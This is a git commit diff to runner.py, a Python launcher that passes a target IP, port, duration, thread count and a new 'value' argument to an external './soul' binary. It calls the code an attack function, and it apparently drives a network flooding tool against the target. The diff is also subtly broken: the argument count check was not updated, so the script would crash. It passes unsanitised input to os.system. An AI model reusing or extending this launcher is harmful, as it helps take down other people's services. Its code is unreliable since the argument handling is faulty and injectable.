d2f104f7cbe050572b8ec58d697c4b34259e8acc
offxsahil <sahilshah786007@gmail.com>
2025-09-17 10:43:40 +0530

    Add files via upload

--- runner.py
+++ runner.py
@@ -7,7 +7,7 @@ import time
 
 # Argument validation
 if len(sys.argv) != 5:
-    print("Usage: python3 runner.py <ip> <port> <time> <threads>")
+    print("Usage: python3 runner.py <ip> <port> <time> <threads> <value>")
     exit()
 
 # Parse arguments
@@ -15,10 +15,11 @@ ip = sys.argv[1]
 port = sys.argv[2]
 attack_time = int(sys.argv[3])
 threads = sys.argv[4]
+value = sys.argv[5]  # example: -1, 0, -2
 
 # Attack function
 def run_attack():
-    os.system(f"./soul {ip} {port} {attack_time} {threads}")
+    os.system(f"./soul {ip} {port} {attack_time} {threads} {value}")
 
 # Start attack in a daemon thread (will exit cleanly)
 attack_thread = threading.Thread(target=run_attack, daemon=True)
